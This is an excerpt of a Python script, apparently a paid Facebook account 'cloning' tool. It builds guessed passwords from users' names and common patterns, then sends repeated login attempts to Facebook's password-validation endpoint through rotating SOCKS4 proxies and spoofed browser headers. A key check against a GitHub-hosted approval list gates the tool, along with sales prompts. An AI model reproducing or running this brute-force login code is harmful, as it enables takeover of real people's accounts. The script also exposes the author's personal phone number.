...
def main():
    stored_password = "RATUL 007"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to RATUL KING TOOLS!")
            os.system('espeak -a 300 "Welcome to Ratul King Tools varson 3.4 ..."')
            time.sleep(2)
            os.system('clear')
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/SAJUx/Saju/blob/main/approved.txt').text
...
def menu_apikey():
  ...
  id = "∞".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/Ratul-King-71/paid-file-cloning/main/Approved.txt').text
  os.system(" clear")
  print("""\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Ratul ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Mar Ratul ]    ║  \033[1;97m  
╠══[Github                • \33[1;38mRatul-King-71 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01834837550 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
╠══[VERSION                  • 3.4 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
  print("\33[1;38m┣━[•]HI BYPASER I FUCK YOUR SYSTEM\33[1;38m")
  print("\33[1;38m┣━[•]FIRST GET APPROVAL\33[1;38m")
  print("\033[1;97m┣━[•]Contract Admin To Buy This Tools\033[1;97m");time.sleep (0.1) 
  print("\033[0;92m┣━[•]\33[0;41mYOUR  KEY \033[0;92m: "+id)
  print("\33[1;34m┣━[•]COPY YOUR KEY AND SEND TO ADMIN\33[1;34m");time.sleep(0.1)
  print("\033[1;35m┣━[•]FOLLOW MAIN ADMIN FACEBOOK ™\033[1;35m");time.sleep(1)
  os.system('xdg-open https://m.facebook.com/ariyan.saju.39')
  time.sleep(3)
  print("\033[1;33m┣━[•]CHECKING YOUR APROVAL™\033[1;33m  ");time.sleep (0.5)
  print("\033[1;33m┣━[•]BUY THIS TOOLS")
  print("\033[0;92m┣━[•][>\33[0;41m 15 DAYS 200 TK \033[0;92m<]")
  print("\033[0;92m┣━[•][>\33[0;41m 30 DAYS 350 TK \033[0;92m<]")
  print("\033[1;97m┗━=============================================\033[1;97m")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Ratul-King-71/paid-file-cloning/main/Approved.txt").text
    if id in httpCaht:
      print("┣━[•]YOUR KEY APROVED  ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:      
      
      print("\033[0;92mYOU ARE NOT APPROED SEND KRY ADMIN GET APPROVED\033[0;92m")
      os.system('xdg-open https://wa.me/+8801834837550?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
#os.system('espeak -a 300 " Welcome To Ratul Boss Tools"')
pass
...
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR NAME \033[1;91m :\033[1;96m "+uname)
    ...
    if Ratul in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801834837550')
        os.system("python nono.py")
    elif Ratul in ['3','03']:
        result()
    elif Ratul in ['0']:
...
def result():
    ...
    if kz in ['1','01']:
        ...
        if len(vin)==0:
            ...
            print('\033[0;91m━━━━━━━━━━━━━━')
            geeh = input(' \033[97;1m[\033[92;1m•\033[97;1m] PRESS > 1 : ')
            print('\033[0;91m━━━━━━━━━━━━━━')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m━━━━━━━━━━━━━')
...
def crack_file():
    print('\033[0;91m==================')
    os.system('espeak -a 300 " Put Your File"')
    print('\033[1;32m[ Put File Example:  /sdcard/Ratul.txt  Etc...]')
...
def setting():
    print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━')    
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mCLONING ONLY MIX IDz")
    print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━')
    ...
    print('\033[0;91m━━━━━━━━━━━━━')
    print('\033[0;91m━━━━━━━━━━━━━')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mHIGH SPEED CLONING \033[0;91m\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCOOCKI NOT SHOW\033[1;37m]")
    print('\033[0;91m━━━━━━━━━━━━━')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
   # os.system("xdg-open https://www.facebook.com/profile.php?id=100089787865577'")
    if hc in ['1','01']:
...
def passwrd():
    ...
    print(logo)
    print("\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗")
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;97mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[1;97mTODAY'S DATE :\033[1;92m "+date)
    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;97mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mHIGH SPEED CLONINH 🇧🇩✅ ")
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;97mUse Flight Mode For Speed Up ')
        ...
        for yuzong in id2:
            ...
            if len(nmf)<6:
                if len(frs)<3:
                    ...
                    pwv.append(frs+'###')
                    pwv.append('@1@2@3@4@4@6')
                    pwv.append(frs+'@1@2@3@4@4@6')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
...
def crack(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            ses.headers.update({"Host":'x.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://x.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.9"})
            ...
            heade = {'Host': 'x.facebook.com', 'viewport-width': '24', 'sec-ch-ua': '" Not A;Brand";v="116", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://x.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.9"})
            p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host':'facebook.com', 'viewport-width': '24', 'sec-ch-ua': '" Not A;Brand";v="116", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
